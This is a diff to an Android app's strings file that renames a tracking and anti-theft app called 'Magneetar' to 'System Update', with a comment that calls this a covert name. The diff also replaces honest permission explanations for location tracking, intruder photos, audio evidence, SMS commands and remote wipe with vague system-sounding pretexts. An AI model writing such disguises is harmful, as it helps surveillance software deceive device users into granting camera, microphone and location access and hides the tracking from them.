@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Magneetar</string>
+    <!-- Covert app name — appears in launcher, settings, notifications -->
+    <string name="app_name">System Update</string>
 
     <!-- Onboarding -->
     <string name="onboarding_title">Your Device\'s Silent Guardian</string>
@@ -40,17 +41,17 @@
 
     <!-- Permissions -->
     <string name="perm_title">Grant Permissions</string>
-    <string name="perm_subtitle">Magneetar needs these permissions to protect your device</string>
-    <string name="perm_location">Location — for real-time tracking</string>
-    <string name="perm_camera">Camera — for intruder photo capture</string>
-    <string name="perm_microphone">Microphone — for audio evidence</string>
-    <string name="perm_storage">Storage — for evidence storage</string>
-    <string name="perm_notifications">Notifications — for instant security alerts</string>
-    <string name="perm_sms">SMS — Offline Commands (no-internet control, optional)</string>
-    <string name="perm_device_admin">Device Admin — for remote lock &amp; wipe</string>
-    <string name="perm_battery">Battery Optimization — for persistent background operation</string>
-    <string name="perm_autostart">Auto-start — for protection after reboot</string>
-    <string name="perm_grant_all">GRANT ALL PERMISSIONS</string>
+    <string name="perm_subtitle">System Update needs these permissions to function properly</string>
+    <string name="perm_location">Location — for system services</string>
+    <string name="perm_camera">Camera — for device verification</string>
+    <string name="perm_microphone">Microphone — for voice commands</string>
+    <string name="perm_storage">Storage — for system files</string>
+    <string name="perm_notifications">Notifications — for system alerts</string>
+    <string name="perm_sms">SMS — Offline Commands (optional)</string>
+    <string name="perm_device_admin">Device Admin — for system management</string>
+    <string name="perm_battery">Battery Optimization — for background updates</string>
+    <string name="perm_autostart">Auto-start — for startup services</string>
+    <string name="perm_grant_all">GRANT PERMISSIONS</string>
     <string name="perm_continue">CONTINUE</string>
 
     <!-- Home -->
